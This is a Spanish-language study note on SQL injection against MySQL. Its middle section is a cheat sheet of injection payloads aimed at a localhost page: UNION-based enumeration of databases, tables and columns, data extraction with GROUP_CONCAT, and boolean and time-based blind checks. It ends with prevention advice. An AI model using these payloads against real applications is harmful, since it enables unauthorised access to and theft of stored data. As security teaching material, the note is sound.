___

- Tags: #sqli #sql #mysql #owasp-top-10 #explotación 

___
# Introducción

Las **Inyecciones SQL** son una categoría de ataques informáticos que aprovechan las vulnerabilidades en las consultas [[SQL]] de una aplicación para ejecutar comandos no autorizados en una base de datos. Estos ataques son una amenaza significativa y requieren una comprensión sólida de cómo se estructuran las consultas [[SQL]] y cómo se pueden manipular para obtener información no autorizada o incluso realizar acciones maliciosas.

## Principios Básicos

1. **Acceso no Autorizado:** Las **inyecciones SQL** pueden permitir a un atacante acceder a información sensible o realizar acciones no permitidas al introducir comandos [[SQL]] maliciosos en los campos de entrada de una aplicación.
    
2. **Estructura de una Inyección SQL:** **Las inyecciones SQL** a menudo se realizan mediante la manipulación de las consultas [[SQL]] que la aplicación envía a la base de datos. Esto se logra agregando instrucciones [[SQL]] maliciosas en los campos de entrada.

____
# Inyecciones basicas:


```
https://localhost/archivo.php?id=3' ORDER BY 1 -- -
```

Con esto sabrás cuántas columnas tiene la tabla donde se está haciendo la consulta; debes empezar desde un número grande hasta un número pequeño hasta que proporcione algún dato.

```
https://localhost/archivo.php?id=valor_grande' UNION SELECT 4 -- -
```

Con esto puedes añadir una nueva fila a la columna o columnas que se están consultando; en este caso, se está añadiendo el 4 y para verlo en pantalla debes modificar el id por un id que no exista.

```
https://localhost/archivo.php?id=valor_grande' UNION SELECT DATABASE() -- -
```

Basándonos en el anterior concepto, así podemos saber el nombre de la base de datos donde está la tabla.

```
https://localhost/archivo.php?id=valor_grande' UNION SELECT SCHEMA_NAME FROM information_schema.schemata LIMIT 0,1 -- -
```

Con esto podemos saber todas las bases de datos que se encuentran, y con el `LIMIT` no muestra la base de datos, pero dependiendo del número que hayamos puesto.

```
https://localhost/archivo.php?id=valor_grande' UNION SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.schemata-- -
```

Ahora, gracias al `GROUP_CONCAT()`, puedes concatenar todas las bases de datos y mostrarlas en una misma línea separadas con comas.

```
https://localhost/archivo.php?id=valor_grande' UNION SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE table_schema='bd'-- -
```

Ya enumeradas las bases de datos, podemos listar la tabla de una en específico con esta inyección.

```
https://localhost/archivo.php?id=valor_grande' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='bd' AND table_name='tabla'-- -
```

Con esta inyección ahora podrás saber las columnas de una tabla en específico.

```
https://localhost/archivo.php?id=valor_grande' UNION SELECT GROUP_CONCAT(columna) FROM tabla-- -
```

Con esto ahora puedes ver todos los datos de una columna de una tabla en específico. Si quieres especificar la base de datos, solo tienes que poner `FROM base_de_datos.tabla` y listo.

```
https://localhost/archivo.php?id=valor_grande' UNION SELECT GROUP_CONCAT(columna, delimitador, columna) FROM tabla-- -
```

Así puedes concatenar una columna con otra columna solo colocando un delimitador de preferencia en hexadecimal.

```
https://localhost/archivo.php?id=numero' AND SLEEP(segundos)-- -
```

Sirve para saber si una página es vulnerable a **inyección SQL**.

```bash
curl -s -I -X GET "http://localhost/archivo.php" -G --data-urlencode "id=valor"
```

Con esto puedes enviar parámetros por **GET** sin necesidad de ponerlos en la **URL**.

```
https://localhost/archivo.php/id=valor' OR (SELECT (SELECT ASCII(SUBSTRING(columna,1,1)) FROM tabla WHERE id = 1)=98)
```

Es una inyección para verificar si el valor **ASCII** del primer carácter de la columna especificada en la tabla es igual a 98 (código **ASCII** de la letra 'b').

```
https://localhost/archivo.php/id=valor AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=72, SLEEP(5), 1)
```

Extrae el primer carácter de la base de datos actual y luego verifica si su valor **ASCII** es igual a 72 (que es la letra 'H'). Si es así, induce un retraso de 5 segundos; de lo contrario, devuelve 1.

____
# Prevención y Buenas Prácticas

1. **Validación de Entradas:** Validar y filtrar las entradas de usuario es crucial para prevenir **inyecciones SQL**. Se deben usar parámetros preparados y consultas parametrizadas.
    
2. **Principio de Menor Privilegio:** Asignar permisos mínimos necesarios para las cuentas de bases de datos y limitar el acceso a la información sensible.
    
3. **Actualizaciones y Parches:** Mantener la aplicación y el sistema de gestión de bases de datos actualizados con los últimos parches de seguridad.
    
4. **Registro y Monitorización:** Implementar registros y sistemas de monitorización para identificar posibles intentos de **inyecciones SQL**.
    

La comprensión y aplicación de estas medidas ayudarán a reducir significativamente el riesgo de ataques de **inyección SQL**, fortaleciendo la seguridad de las aplicaciones y sistemas que interactúan con bases de datos.